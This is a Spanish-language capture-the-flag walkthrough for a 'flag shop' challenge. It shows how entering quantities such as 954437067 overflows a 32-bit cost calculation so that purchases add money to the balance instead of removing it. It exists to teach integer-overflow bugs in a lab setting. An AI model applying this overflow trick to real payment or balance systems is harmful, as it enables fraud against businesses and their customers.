## Descripcion
There's a flag shop selling stuff, can you buy a flag?
## Solucion
### 1. Conectarse al servidor

Ejecuta:

```
nc xebec.cylabacademy.net 17914
```

Aparecerá:

```
Welcome to the flag exchange
We sell flags

1. Check Account Balance
2. Buy Flags
3. Exit
```

Primero podemos comprobar el saldo:

```
1
```

Normalmente comienza con:

```
Balance: 1100
```

---

### 2. Entrar a la tienda

Selecciona:

```
2
```

Aparecerán dos tipos de bandera:

```
1. Defintely not the flag Flag
2. 1337 Flag
```

Selecciona:

```
1
```

La primera bandera cuesta:

```
900
```

y el programa pregunta:

```
These knockoff Flags cost 900 each, enter desired quantity
```

---

### 3. Provocar el integer overflow

Aquí está la vulnerabilidad.

El programa realiza:

```
total_cost = 900 * number_flags;
```

Como `total_cost` es un `int` de 32 bits, el valor máximo positivo es:

```
2147483647
```

Una forma clásica de explotar el reto es introducir:

```
2147483647
```

Entonces el cálculo:

```
900 * 2147483647
```

desborda el entero y en el entorno del reto termina produciendo:

```
The final cost is: -900
```

Esto es importante porque después el programa hace:

```
account_balance = account_balance - total_cost;
```

Por lo tanto:

```
1100 - (-900) = 2000
```

En lugar de perder dinero, **ganamos 900**. Este comportamiento es precisamente el que aprovecha el reto.

---

### 4. Repetir el proceso

Después de introducir:

```
2147483647
```

el saldo debería aumentar de:

```
1100
```

a:

```
2000
```

Luego podemos repetir:

```
2
1
2147483647
```

Cada operación aumenta el saldo en aproximadamente:

```
900
```

Necesitamos llegar al menos a:

```
100000
```

La solución documentada para el reto original hace justamente esto hasta alcanzar aproximadamente `100100`.

---

### 5. Forma más rápida

En lugar de repetir manualmente 110 veces, podemos aprovechar un valor que produzca directamente un costo negativo suficientemente grande.

Una cantidad válida es:

```
954437067
```

Con ella:

```
900 * 954437067
```

produce, por desbordamiento de un entero de 32 bits, un costo equivalente a:

```
-98900
```

Así, partiendo de `1100`:

```
1100 - (-98900) = 100000
```

Entonces el flujo sería:

```
2
1
954437067
```

y deberías obtener algo parecido a:

```
The final cost is: -98900
Your current balance after transaction: 100000
```

---

### 6. Comprar la bandera real

Ahora vuelve a seleccionar:

```
2
```

Selecciona:

```
2
```

El programa pedirá:

```
Enter 1 to buy one
```

Introduce:

```
1
```

Como ahora tienes al menos `100000`, la compra será aceptada y el servidor debería mostrar:

```
YOUR FLAG IS: picoCTF{...}
```

**Esa es la bandera que debes entregar**, y puede ser distinta de las flags documentadas de las versiones antiguas del reto.

### Resumen para apuntes

```
nc xebec.cylabacademy.net 17914

1. Comprobar saldo:
   1

2. Seleccionar compra:
   2

3. Comprar la bandera falsa:
   1

4. Introducir una cantidad grande:
   954437067

5. El costo se desborda y se vuelve:
   -98900

6. El saldo aumenta:
   1100 - (-98900) = 100000

7. Comprar la bandera real:
   2
   2
   1
```
## Notas adicionales

## Referencias